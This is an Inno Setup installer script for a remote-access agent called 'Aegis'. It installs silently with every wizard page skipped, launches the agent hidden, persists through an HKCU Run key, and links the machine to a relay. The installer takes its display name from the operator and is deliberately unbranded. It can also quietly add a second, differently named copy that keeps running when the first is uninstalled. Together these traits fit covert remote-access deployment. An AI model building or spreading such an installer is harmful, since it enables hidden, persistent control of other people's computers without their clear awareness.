; Aegis Remote Agent — Inno Setup installer script.
; Produces AegisRemoteSetup.exe: the customer runs it, it installs the agent,
; starts it immediately (hidden, to tray) and on every login, and registers a
; proper uninstaller in Add/Remove Programs. Uninstalling stops the agent and
; removes everything — i.e. revokes remote access.

#define AppName "Support"
#define AppVersion "0.1.0"
#define AppExe "support.exe"

[Setup]
AppId={{9E2B7C41-5A3D-4E88-9F1A-AE61C0D2F3B7}
; AppName / DefaultDirName / UninstallDisplayName use the operator-chosen first
; software name (fetched from /api/key-meta at install time). Falls back to
; "Support" if the API call fails or no name is set — preserving the exact
; legacy single-install behaviour for every key built before this change.
AppName={code:GetFirstName|Support}
AppVersion={#AppVersion}
AppPublisher={code:GetFirstName|Support}
; Per-user install: no admin/UAC prompt — "just download and install".
DefaultDirName={autopf}\{code:GetFirstName|Support}
DefaultGroupName={code:GetFirstName|Support}
DisableProgramGroupPage=yes
DisableDirPage=yes
DisableWelcomePage=yes
DisableReadyPage=yes
DisableFinishedPage=yes
OutputDir=release
OutputBaseFilename=support
Compression=lzma2/max
SolidCompression=yes
WizardStyle=modern
PrivilegesRequired=lowest
ArchitecturesInstallIn64BitMode=x64
; No custom installer icon (business build) — Inno uses its neutral default,
; so the installer .exe carries no branded/identifiable icon (like ScreenConnect).
; SetupIconFile=build\icon.ico
UninstallDisplayIcon={app}\{#AppExe}
UninstallDisplayName={code:GetFirstName|Support}

[Files]
Source: "release\Aegis\*"; DestDir: "{app}"; Flags: recursesubdirs createallsubdirs ignoreversion

; Run key is handled in [Code] (WriteRunKey) so it can be conditionally formed
; with --user-data-dir when dual-install is active and matched to the operator-
; chosen first name. Pascal uninstall step removes it.

[Code]
const
  RELAY_URL = 'wss://aegis-relay-production.up.railway.app';
  API_BASE  = 'https://aegis-relay-production.up.railway.app';

var
  // Cached /api/key-meta result. FetchKeyMeta runs once and populates these.
  g_firstName:    String;
  g_secondName:   String;
  g_metaFetched:  Boolean;

// Force-skip every interactive wizard page (DisableReadyPage alone wasn't honored)
// so a double-click goes straight to installing with no clicks.
function ShouldSkipPage(PageID: Integer): Boolean;
begin
  Result := (PageID = wpWelcome) or (PageID = wpLicense) or (PageID = wpPassword)
    or (PageID = wpInfoBefore) or (PageID = wpUserInfo) or (PageID = wpSelectDir)
    or (PageID = wpSelectComponents) or (PageID = wpSelectProgramGroup)
    or (PageID = wpSelectTasks) or (PageID = wpReady) or (PageID = wpInfoAfter)
    or (PageID = wpFinished);
end;

// Kill the primary install's agent processes, filtered by install path so a
// sibling second-copy install (dual-install mode) keeps running untouched.
// Falls back to a blanket taskkill if PowerShell is unavailable OR the install
// dir isn't resolvable yet (ancient Windows / pre-DefaultDirName call).
procedure KillAgent;
var
  ResultCode: Integer;
  appDir: String;
begin
  appDir := '';
  try appDir := ExpandConstant('{app}'); except end;
  if appDir <> '' then begin
    Exec(ExpandConstant('{sys}\windowspowershell\v1.0\powershell.exe'),
      '-NoProfile -WindowStyle Hidden -Command "try { Get-Process support,injector,Aegis -EA SilentlyContinue | Where-Object { $_.Path -and $_.Path.ToLower().StartsWith(('''
      + Lowercase(appDir)
      + ''').ToLower()) } | Stop-Process -Force -EA SilentlyContinue } catch {}"',
      '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    exit;
  end;
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM support.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM Aegis.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  Exec(ExpandConstant('{sys}\taskkill.exe'), '/F /IM injector.exe', '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
end;

// Pull a "name": "value" string out of the agent's simple JSON config.
// Forward-defined so FetchKeyMeta below can call it; the uninstall-side
// variant (JsonStr) at the bottom of the file is identical.
function JsonStrFwd(s, name: String): String;
var
  p, q: Integer;
begin
  Result := '';
  p := Pos('"' + name + '"', s);
  if p = 0 then exit;
  s := Copy(s, p, Length(s));
  p := Pos(':', s); if p = 0 then exit;
  s := Copy(s, p + 1, Length(s));
  p := Pos('"', s); if p = 0 then exit;
  s := Copy(s, p + 1, Length(s));
  q := Pos('"', s); if q = 0 then exit;
  Result := Copy(s, 1, q - 1);
end;

// The enrollment key is embedded as a trailer at the END of this exe by the
// relay (##AEGIS-KEY##[KEY]##AEGIS-END##), read from the file itself so it works
// no matter how the download was renamed. Falls back to the filename
// (AegisSetup-<KEY>.exe) for older/manual installers.
function GetKeyFromTrailer: String;
var
  data: AnsiString;
  p1, p2: Integer;
begin
  Result := '';
  try
    if not LoadStringFromFile(ExpandConstant('{srcexe}'), data) then exit;
    p1 := Pos('##AEGIS-KEY##[', data);
    if p1 > 0 then
    begin
      data := Copy(data, p1 + 14, Length(data)); { 14 = Length('##AEGIS-KEY##[') }
      p2 := Pos(']##AEGIS-END##', data);
      if p2 > 0 then Result := String(Copy(data, 1, p2 - 1));
    end;
  except
  end;
end;
function GetKeyFromFilename: String;
var
  fn: String;
begin
  Result := '';
  fn := ExtractFileName(ExpandConstant('{srcexe}'));
  if Pos('support-', fn) = 1 then
    Result := Copy(fn, Length('support-') + 1, Length(fn))
  else if Pos('AegisSetup-', fn) = 1 then
    Result := Copy(fn, Length('AegisSetup-') + 1, Length(fn));  { legacy fallback }
  if (Length(Result) >= 4) and (Lowercase(Copy(Result, Length(Result) - 3, 4)) = '.exe') then
    Result := Copy(Result, 1, Length(Result) - 4);
end;
function GetEnrollKey: String;
begin
  Result := GetKeyFromTrailer;
  if Result = '' then Result := GetKeyFromFilename;
end;

// Call /api/key-meta ONCE to resolve the operator-chosen names for this
// enrollment key. Cached in globals so subsequent GetFirstName/GetSecondName
// calls (and the DefaultDirName / UninstallDisplayName lookups the Inno engine
// does before the install begins) all return the same values. Fails open: on
// any error the primary name falls back to "Support" and secondary stays ""
// — i.e. legacy single-install behaviour.
procedure FetchKeyMeta;
var
  http: Variant;
  key: String;
begin
  if g_metaFetched then exit;
  g_metaFetched := True;
  g_firstName := 'Support';
  g_secondName := '';
  key := GetEnrollKey;
  if key = '' then exit;
  try
    http := CreateOleObject('WinHttp.WinHttpRequest.5.1');
    http.SetTimeouts(5000, 5000, 5000, 8000);
    http.Open('POST', API_BASE + '/api/key-meta', False);
    http.SetRequestHeader('Content-Type', 'application/json');
    http.Send('{"key":"' + key + '"}');
    if http.Status = 200 then begin
      g_firstName  := JsonStrFwd(String(http.ResponseText), 'appName');
      g_secondName := JsonStrFwd(String(http.ResponseText), 'appName2');
      if g_firstName = '' then g_firstName := 'Support';
    end;
  except
    // Network / COM error — fall through to defaults; single-install path still works.
  end;
end;
// Resolvers for the `{code:...}` constants in the [Setup] section. Inno Setup
// calls these BEFORE anything else, so FetchKeyMeta runs here on first use.
// The |Param provides the Inno-side default used only if the function returns
// an empty string, which it never does.
function GetFirstName(Param: String): String;
begin
  FetchKeyMeta;
  Result := g_firstName;
end;
function GetSecondName(Param: String): String;
begin
  FetchKeyMeta;
  Result := g_secondName;
end;

// Write agent config at an arbitrary install dir. In dual-install mode each
// copy gets its own config with the right `instance` + `appName`; the single-
// install legacy path writes neither (preserves bit-for-bit behaviour with
// pre-dual builds, so older relay/agent code sees exactly what it saw before).
procedure WriteConfig(dir, key: String; instance: Integer; appName: String; dual: Boolean);
var
  cfg, cfgPath: String;
begin
  if dual then
    cfg := '{' + #13#10 +
           '  "relay": "' + RELAY_URL + '",' + #13#10 +
           '  "key": "' + key + '",' + #13#10 +
           '  "enabled": true,' + #13#10 +
           '  "instance": ' + IntToStr(instance) + ',' + #13#10 +
           '  "appName": "' + appName + '"' + #13#10 + '}'
  else
    cfg := '{' + #13#10 +
           '  "relay": "' + RELAY_URL + '",' + #13#10 +
           '  "key": "' + key + '",' + #13#10 +
           '  "enabled": true' + #13#10 + '}';
  cfgPath := dir + '\resources\app\agent\config.default.json';
  SaveStringToFile(cfgPath, cfg, False);
end;

// Register a HKCU Run entry so the agent auto-starts on login. In dual mode
// each copy launches with its own --user-data-dir so Electron sees them as
// two separate user profiles (otherwise they collide on the single-instance
// lock and only one would actually run).
procedure WriteRunKey(valueName, exePath, dataDir: String);
var
  cmd: String;
begin
  if dataDir <> '' then
    cmd := '"' + exePath + '" --startup --user-data-dir="' + dataDir + '"'
  else
    cmd := '"' + exePath + '" --startup';
  RegWriteStringValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Run', valueName, cmd);
end;

// Register a HKCU Uninstall entry so the Add/Remove Programs list shows the
// copy as its own item with its own uninstaller. Each copy's uninstaller only
// removes ITS copy; the sibling keeps running. The second copy uses a tiny
// PowerShell script we drop next to its files (Inno Setup's unins.exe is
// bound to the primary install and can't cleanly re-point).
procedure WriteArp(arpKey, displayName, uninstallCmd, iconPath: String);
begin
  RegWriteStringValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Uninstall\' + arpKey, 'DisplayName', displayName);
  RegWriteStringValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Uninstall\' + arpKey, 'UninstallString', uninstallCmd);
  RegWriteStringValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Uninstall\' + arpKey, 'DisplayIcon', iconPath);
  RegWriteStringValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Uninstall\' + arpKey, 'Publisher', displayName);
  RegWriteDWordValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Uninstall\' + arpKey, 'NoModify', 1);
  RegWriteDWordValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Uninstall\' + arpKey, 'NoRepair', 1);
end;

// Install the second copy by COPYING files from the already-installed primary
// (so the compressed [Files] source doesn't double in the installer binary).
// Writes a self-contained PowerShell uninstaller next to the copy so the
// Add/Remove Programs entry works even though Inno's unins.exe only owns the
// primary install.
procedure InstallSecondCopy(key, name2: String);
var
  srcDir, dstDir, dataDir, uninstScript, uninstCmd: String;
  ResultCode: Integer;
begin
  srcDir := ExpandConstant('{app}');
  dstDir := ExpandConstant('{autopf}') + '\' + name2;
  dataDir := dstDir + '\userdata';
  if not DirExists(dstDir) then
    ForceDirectories(dstDir);
  // xcopy's /E /I /Y /Q = recurse (incl. empty dirs), target is a dir, overwrite
  // without prompting, quiet. Everything in the primary install folder is
  // self-contained Electron + agent code; no symlinks, no reparse points.
  Exec(ExpandConstant('{sys}\xcopy.exe'),
    '"' + srcDir + '\*" "' + dstDir + '\" /E /I /Y /Q',
    '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
  WriteConfig(dstDir, key, 2, name2, True);
  // Build a PowerShell uninstaller for the second copy — kills ITS processes
  // (filtered by Path so the primary stays alive), reports uninstall to the
  // relay, scrubs the Run + ARP entries we created, and removes the folder.
  uninstScript := dstDir + '\uninstall-copy.ps1';
  SaveStringToFile(uninstScript,
    '# Second-copy uninstaller — removes this install only; leaves the sibling.' + #13#10 +
    'try {' + #13#10 +
    '  Get-Process support,injector -EA SilentlyContinue | Where-Object { $_.Path -and $_.Path.ToLower().StartsWith((''' + Lowercase(dstDir) + ''').ToLower()) } | Stop-Process -Force -EA SilentlyContinue' + #13#10 +
    '  Start-Sleep -Milliseconds 800' + #13#10 +
    '  try {' + #13#10 +
    '    $cfg = Get-Content ''' + dstDir + '\resources\app\agent\config.default.json'' -Raw | ConvertFrom-Json' + #13#10 +
    '    $id = $null' + #13#10 +
    '    foreach ($p in @(''' + dataDir + '\device-id'', ''' + ExpandConstant('{userappdata}') + '\Support\device-id'')) { if (Test-Path $p) { $id = (Get-Content $p -Raw -EA SilentlyContinue).Trim(); if ($id) { break } } }' + #13#10 +
    '    if ($id) {' + #13#10 +
    '      $body = @{id=$id; key=$cfg.key} | ConvertTo-Json -Compress' + #13#10 +
    '      $tmp = Join-Path $env:TEMP ''hc-uninstall-body.json''' + #13#10 +
    '      [System.IO.File]::WriteAllText($tmp, $body)' + #13#10 +
    '      & curl.exe --silent --max-time 5 -X POST -H ''Content-Type: application/json'' --data ''@''$tmp ''' + API_BASE + '/api/uninstall'' | Out-Null' + #13#10 +
    '      Remove-Item $tmp -EA SilentlyContinue' + #13#10 +
    '    }' + #13#10 +
    '  } catch {}' + #13#10 +
    '  Remove-Item ''HKCU:\Software\Microsoft\Windows\CurrentVersion\Uninstall\' + name2 + ''' -Force -EA SilentlyContinue' + #13#10 +
    '  Remove-ItemProperty ''HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'' -Name ''' + name2 + ''' -EA SilentlyContinue' + #13#10 +
    '  Start-Sleep -Milliseconds 400' + #13#10 +
    '  cmd /c "ping localhost -n 2 >nul & rmdir /s /q `"' + dstDir + '`""' + #13#10 +
    '} catch {}' + #13#10,
    False);
  uninstCmd := 'powershell.exe -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "' + uninstScript + '"';
  WriteArp(name2, name2, uninstCmd, dstDir + '\{#AppExe}');
  WriteRunKey(name2, dstDir + '\{#AppExe}', dataDir);
  // Launch the second copy immediately (hidden, with its own userdata dir).
  Exec(dstDir + '\{#AppExe}', '--startup --user-data-dir="' + dataDir + '"', '', SW_HIDE, ewNoWait, ResultCode);
end;

// IMPORTANT: do NOT try to self-relaunch /VERYSILENT here. Inno 6.7's
// RedirectionGuard denies a setup Exec'ing its own exe (ACCESS DENIED / rc=5),
// and every workaround (copy-to-temp + re-exec, cmd start, etc.) either fails
// the same way or spawns errant popups. A double-click therefore shows a brief
// wizard. Customers download via /dl/<key> → the VBS launcher calls this with
// /VERYSILENT → truly silent for real users. That is the intended path; the
// wizard on a plain double-click is a test-only artifact.
// After install: write the agent's config (relay + enrollment key) and launch it.
// If the enrollment key was built with a second software name (dual-install),
// also install a parallel copy under that name — see InstallSecondCopy.
procedure CurStepChanged(CurStep: TSetupStep);
var
  key, dataDir1: String;
  dual: Boolean;
  ResultCode: Integer;
begin
  if CurStep = ssPostInstall then
  begin
    FetchKeyMeta;
    key := GetEnrollKey;
    dual := g_secondName <> '';
    if key <> '' then WriteConfig(ExpandConstant('{app}'), key, 1, g_firstName, dual);
    if dual then begin
      dataDir1 := ExpandConstant('{app}') + '\userdata';
      WriteRunKey(g_firstName, ExpandConstant('{app}\{#AppExe}'), dataDir1);
      // Secondary copy — only when the key was built with a second name.
      if key <> '' then InstallSecondCopy(key, g_secondName);
      // Launch primary with its own userdata dir so Electron doesn't collide
      // with the secondary copy on its single-instance lock.
      Exec(ExpandConstant('{app}\{#AppExe}'), '--startup --user-data-dir="' + dataDir1 + '"', '', SW_HIDE, ewNoWait, ResultCode);
    end else begin
      // Single-install path — identical to the pre-dual installer.
      WriteRunKey('Support', ExpandConstant('{app}\{#AppExe}'), '');
      Exec(ExpandConstant('{app}\{#AppExe}'), '--startup', '', SW_HIDE, ewNoWait, ResultCode);
    end;
  end;
end;

// Stop any running instance before overwriting files (handles reinstall/upgrade).
function PrepareToInstall(var NeedsRestart: Boolean): String;
begin
  KillAgent;
  Sleep(1200);
  Result := '';
end;

// Pull a "name": "value" string out of the agent's simple JSON config.
function JsonStr(s, name: String): String;
var
  p, q: Integer;
begin
  Result := '';
  p := Pos('"' + name + '"', s);
  if p = 0 then exit;
  s := Copy(s, p, Length(s));
  p := Pos(':', s); if p = 0 then exit;
  s := Copy(s, p + 1, Length(s));
  p := Pos('"', s); if p = 0 then exit;
  s := Copy(s, p + 1, Length(s));
  q := Pos('"', s); if q = 0 then exit;
  Result := Copy(s, 1, q - 1);
end;

// Tell the relay this machine is being uninstalled, so the dashboard shows
// "Uninstalled" (and tracks the uninstall rate) instead of a silent offline.
procedure ReportUninstall;
var
  http: Variant;
  deviceId, key, idPath, cfgPath, body: String;
  raw: AnsiString;
begin
  idPath := ExpandConstant('{userappdata}\Support\device-id');
  if not LoadStringFromFile(idPath, raw) then exit;
  deviceId := Trim(String(raw));
  if deviceId = '' then exit;
  cfgPath := ExpandConstant('{app}\resources\app\agent\config.default.json');
  if LoadStringFromFile(cfgPath, raw) then key := JsonStr(String(raw), 'key') else key := '';
  body := '{"id":"' + deviceId + '","key":"' + key + '"}';
  try
    http := CreateOleObject('WinHttp.WinHttpRequest.5.1');
    http.SetTimeouts(3000, 3000, 3000, 5000);
    http.Open('POST', API_BASE + '/api/uninstall', False);
    http.SetRequestHeader('Content-Type', 'application/json');
    http.Send(body);
  except
    // best-effort — never block the uninstall on a network hiccup
  end;
end;

// Read the appName baked into the primary's installed config so the uninstall
// step knows which HKCU Run value name to delete. Falls back to "Support" for
// legacy single installs that never wrote the field.
function GetInstalledAppName: String;
var
  raw: AnsiString;
  cfgPath: String;
begin
  Result := 'Support';
  cfgPath := ExpandConstant('{app}\resources\app\agent\config.default.json');
  if LoadStringFromFile(cfgPath, raw) then begin
    Result := JsonStr(String(raw), 'appName');
    if Result = '' then Result := 'Support';
  end;
end;

// On uninstall: report it to the relay, kill ONLY the primary's processes
// (filtered by path so a sibling second copy keeps running), then remove the
// Run key we created in [Code]. Inno Setup's own file removal happens after
// this hook returns. Deliberately does NOT touch the second copy — if the
// operator wants that gone too, they uninstall it from its own ARP entry.
procedure CurUninstallStepChanged(CurUninstallStep: TUninstallStep);
var
  appName: String;
  ResultCode: Integer;
begin
  if CurUninstallStep = usUninstall then
  begin
    appName := GetInstalledAppName;
    ReportUninstall;
    // Path-filtered kill: only stop support/injector running from THIS install
    // folder, so a sibling second copy under a different folder is untouched.
    Exec(ExpandConstant('{sys}\windowspowershell\v1.0\powershell.exe'),
      '-NoProfile -WindowStyle Hidden -Command "try { Get-Process support,injector -EA SilentlyContinue | Where-Object { $_.Path -and $_.Path.ToLower().StartsWith(('''
      + Lowercase(ExpandConstant('{app}'))
      + ''').ToLower()) } | Stop-Process -Force -EA SilentlyContinue } catch {}"',
      '', SW_HIDE, ewWaitUntilTerminated, ResultCode);
    Sleep(1200);
    RegDeleteValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Run', appName);
    // Backward compat: older single installs always used the hardcoded "Support"
    // Run value — delete that too so an upgrade->uninstall path cleans up.
    if appName <> 'Support' then
      RegDeleteValue(HKCU, 'Software\Microsoft\Windows\CurrentVersion\Run', 'Support');
  end;
end;
